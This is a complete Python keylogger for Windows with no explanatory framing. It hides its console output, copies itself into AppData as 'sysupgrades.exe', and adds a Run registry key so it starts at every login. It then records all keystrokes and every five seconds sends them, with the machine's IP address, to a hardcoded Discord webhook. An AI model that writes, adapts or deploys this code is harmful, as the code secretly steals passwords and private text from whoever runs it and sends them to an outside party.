import pynput.keyboard
import threading
import os
import shutil
import sys
import subprocess
import socket
import time
from dhooks import Webhook


hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)

webhook_url = "https://discord.com/api/webhooks/1277985827409887284/hwgu1bb-lbydDJGuEaatEaOkXX8e2lavR_vgnzJsZmkL1RL7d73CPJgdkrBQ-lbcmSFs"
hook = Webhook(webhook_url)

sys.stdout = open(os.devnull, 'w')

def add_to_registry():
    new_file = os.environ["appdata"] + "\\sysupgrades.exe"
    if not os.path.exists(new_file):
        shutil.copyfile(sys.executable, new_file)
        regedit_command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d " + new_file
        subprocess.call(regedit_command, shell=True)

add_to_registry()

log = ""

def is_capslock_on():
    return subprocess.check_output(['powershell', '-command', '[console]::CapsLock']).decode().strip().lower() == "true"

def is_numlock_on():
    return subprocess.check_output(['powershell', '-command', '[console]::NumberLock']).decode().strip().lower() == "true"

def callback_function(key):
    global log
    try:
        if key.char:
            char = key.char
            if is_capslock_on() and char.isalpha():
                char = char.upper()
            log += char
        elif is_numlock_on() and hasattr(key, 'vk'):
            numpad_map = {
                96: '0', 97: '1', 98: '2', 99: '3',
                100: '4', 101: '5', 102: '6', 103: '7',
                104: '8', 105: '9'
            }
            if key.vk in numpad_map:
                log += numpad_map[key.vk]
    except AttributeError:
        if key == key.space:
            log += " SPACE "
        elif key == key.enter:
            log += " ENTER "
        elif key == key.tab:
            log += " TAB "
        elif key == key.backspace:
            log += " BACKSPACE "
        elif key == key.esc:
            log += " ESC "
        else:
            pass

def send_webhook(hook, message):
    attempt = 0
    while attempt < 7:
        try:
            hook.send(message)
            return
        except Exception:
            attempt += 1
            time.sleep(7)

def webhook_thread(hook, message):
    with threading.Lock():
        send_webhook(hook, message)

keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)

def thread_function():
    global log
    timer_object = threading.Timer(5, thread_function)
    webhook_message = f"IP Adresi: {ip_address}\n{log}"
    thread = threading.Thread(target=webhook_thread, args=(hook, webhook_message))
    thread.start()
    log = ""
    timer_object.start()

with keylogger_listener:
    thread_function()
    keylogger_listener.join()
